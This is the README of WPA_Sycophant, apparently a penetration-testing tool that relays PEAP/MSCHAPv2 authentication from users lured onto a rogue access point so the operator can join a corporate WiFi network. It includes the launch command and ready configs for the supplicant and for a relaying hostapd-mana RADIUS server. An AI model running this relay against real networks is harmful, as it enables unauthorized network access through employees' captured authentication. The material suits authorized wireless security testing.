

# WPA_Sycophant

A tool to relay phase 2 authentication attempts to access corporate wireless without cracking the password. 


## Current support

 - Basic PEAP using MSCHAPv2


## How-To

To use this technique it is required that you run a rogue access point so that a legitimate user will connect to you so that you may relay the authentication attempt to Sycophant. 

To do this with [hostapd-mana](https://github.com/sensepost/hostapd-mana) you add a flag `sycophant_enable` Mana will write down the first part of the challenge response once a user connects. This is picked up by Sycophant to initiate the handshake against the target WiFi. 


Running wpa_sycophant may be done using the script `wpa_sycophant.sh` and the current supported commands are: 

   - `-c` to give it a config file, I suggest modifying the provided example.
   - `-i` to provide the interface to use. 

an example command would be:
    
    sudo ./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlp0s20f0u6


## Example Config

```
network={
  ssid="TestingEAP"
  # The SSID you would like to relay and authenticate against. 
  scan_ssid=1
  key_mgmt=WPA-EAP
  # Do not modify
  identity=""
  anonymous_identity=""
  password=""
  # This initialises the variables for me.
  # -------------
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  # Dont want to connect back to ourselves,
  # so add your rogue BSSID here.
  bssid_blacklist=00:14:22:01:23:45
}
```


## Dont Relay to yourself

Since you will be running a rogue AP potentialy near by your supplicant there is the possiblity that you will try relay to yourself. To stop this check the MAC/BSSID of your access point and add that to the `bssid_blacklist` of your config. 



## Remote Relay

If you would like to separate the AP and Sycophant so that they are running on separate hosts or you wish to use Enterprise grade equipment. 

This may be done by running MANA in RADIUS only mode. This will create a local RADIUS server that will relay the authentication to the local Sycophant. This allows you to setup your rogue to use that remote RADIUS server and relay credentials over the Internet or other networks.

A example RADIUS server config for MANA with Sycophant enabled is below:

```
interface=<Ethernet Interface>
driver=wired
# If you would like to run on loopback:
#driver=none 

eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=rogue-ca.pem
server_cert=radius.pem
private_key=radius.key
private_key_passwd=

radius_server_clients=hostapd.radius_clients
# Contents of hostapd.radius_clients:
# 0.0.0.0/0 P@ssw0rd

radius_server_auth_port=1812

# -1 = log all messages
logger_syslog=-1
logger_stdout=-1

# 2 = informational messages
logger_syslog_level=1
logger_stdout_level=1

sycophant_enable=1
```

You may then use this remote RADIUS server with any AP that supports RADIUS authentication. 